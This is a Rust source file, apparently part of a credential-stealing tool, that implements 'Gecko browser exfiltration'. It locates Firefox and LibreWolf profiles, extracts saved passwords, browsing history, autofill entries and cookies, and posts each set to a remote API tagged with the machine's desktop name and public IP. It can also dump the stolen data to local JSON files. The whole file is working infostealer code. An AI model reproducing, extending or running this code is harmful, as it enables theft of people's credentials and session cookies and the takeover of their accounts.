use anyhow::Result;
use std::path::PathBuf;

use super::profiles::ProfileFinder;
use super::data_extractor::{DataExtractor, BrowserData};
use crate::utils;

/// Configuration for Gecko browser exfiltration
#[derive(Debug, Clone)]
pub struct GeckoConfig {
    pub verbose: bool,
    pub output_dir: Option<PathBuf>,
}

impl Default for GeckoConfig {
    fn default() -> Self {
        Self {
            verbose: false,
            output_dir: None,
        }
    }
}

/// Main entry point for Gecko browser exfiltration
pub async fn run_gecko_exfiltration(config: GeckoConfig) -> Result<()> {
    if config.verbose {
        println!("Starting Gecko browser exfiltration...");
    }

    // Find all Firefox and LibreWolf profiles
    let profiles = match ProfileFinder::find_all_profiles() {
        Ok(profiles) => profiles,
        Err(e) => {
            if config.verbose {
                eprintln!("No Gecko browser profiles found: {}", e);
            }
            return Ok(());
        }
    };

    if config.verbose {
        println!("Found {} Gecko browser profiles", profiles.len());
    }

    let mut all_browser_data = Vec::new();

    // Process each profile
    for profile in profiles {
        match DataExtractor::extract_profile_data(&profile) {
            Ok(browser_data) => {
                if config.verbose {
                    println!("Successfully extracted data from {} profile: {}", 
                        browser_data.browser_type, browser_data.profile_name);
                    println!("  - {} passwords", browser_data.passwords.len());
                    println!("  - {} history entries", browser_data.history.len());
                    println!("  - {} form entries", browser_data.form_history.len());
                    println!("  - {} cookies", browser_data.cookies.len());
                }

                // Post each data type separately like chromium does
                post_browser_data_to_api(&browser_data, &config).await;
                
                all_browser_data.push(browser_data);
            }
            Err(e) => {
                eprintln!("Failed to extract data from {} profile {}: {}", 
                    profile.browser_type.name(), profile.name, e);
                continue;
            }
        }
    }

    // Save data to output directory if specified
    if let Some(output_dir) = &config.output_dir {
        save_data_to_files(&all_browser_data, output_dir).await?;
    }

    Ok(())
}

/// Post browser data to API in separate calls like chromium does
async fn post_browser_data_to_api(browser_data: &BrowserData, config: &GeckoConfig) {
    use serde_json::json;

    let base_data = json!({
        "browser": browser_data.browser_type,
        "desktop_name": crate::DESKTOP_NAME.to_string(),
        "ip": crate::PUBLIC_IP.to_string(),
    });

    // Post passwords if we have any
    if !browser_data.passwords.is_empty() {
        let mut passwords_data = base_data.clone();
        passwords_data["passwords"] = json!(browser_data.passwords);
        
        if let Err(e) = utils::post_json_to_api(&passwords_data, "browser").await {
            eprintln!("Failed to post {} passwords: {}", browser_data.browser_type, e);
        } else {
            println!("[*] {} {} passwords extracted and posting to API", 
                browser_data.passwords.len(), browser_data.browser_type);
        }
    }

    // Post history if we have any
    if !browser_data.history.is_empty() {
        let mut history_data = base_data.clone();
        history_data["history"] = json!(browser_data.history);
        
        if let Err(e) = utils::post_json_to_api(&history_data, "browser").await {
            eprintln!("Failed to post {} history: {}", browser_data.browser_type, e);
        } else {
            println!("[*] {} {} history extracted and posting to API", 
                browser_data.history.len(), browser_data.browser_type);
        }
    }

    // Post form history if we have any
    if !browser_data.form_history.is_empty() {
        let mut form_data = base_data.clone();
        form_data["autofill"] = json!(browser_data.form_history);
        
        if let Err(e) = utils::post_json_to_api(&form_data, "browser").await {
            eprintln!("Failed to post {} autofill: {}", browser_data.browser_type, e);
        } else {
            println!("[*] {} {} autofill extracted and posting to API", 
                browser_data.form_history.len(), browser_data.browser_type);
        }
    }

    // Post cookies if we have any
    if !browser_data.cookies.is_empty() {
        let mut cookies_data = base_data.clone();
        cookies_data["cookies"] = json!(browser_data.cookies);
        
        if let Err(e) = utils::post_json_to_api(&cookies_data, "browser").await {
            eprintln!("Failed to post {} cookies: {}", browser_data.browser_type, e);
        } else {
            println!("[*] {} {} cookies extracted and posting to API", 
                browser_data.cookies.len(), browser_data.browser_type);
        }
    }
}

/// Save browser data to individual files
async fn save_data_to_files(browser_data: &[BrowserData], output_dir: &PathBuf) -> Result<()> {
    use std::fs;
    use serde_json;

    // Create output directory if it doesn't exist
    fs::create_dir_all(output_dir)?;

    for data in browser_data {
        let browser_name = format!("{}_{}", data.browser_type, data.profile_name);
        
        // Save passwords
        if !data.passwords.is_empty() {
            let passwords_file = output_dir.join(format!("{}_passwords.json", browser_name));
            let passwords_json = serde_json::to_string_pretty(&data.passwords)?;
            fs::write(&passwords_file, passwords_json)?;
        }

        // Save history
        if !data.history.is_empty() {
            let history_file = output_dir.join(format!("{}_history.json", browser_name));
            let history_json = serde_json::to_string_pretty(&data.history)?;
            fs::write(&history_file, history_json)?;
        }

        // Save form history
        if !data.form_history.is_empty() {
            let forms_file = output_dir.join(format!("{}_formhistory.json", browser_name));
            let forms_json = serde_json::to_string_pretty(&data.form_history)?;
            fs::write(&forms_file, forms_json)?;
        }

        // Save cookies
        if !data.cookies.is_empty() {
            let cookies_file = output_dir.join(format!("{}_cookies.json", browser_name));
            let cookies_json = serde_json::to_string_pretty(&data.cookies)?;
            fs::write(&cookies_file, cookies_json)?;
        }
    }

    Ok(())
}
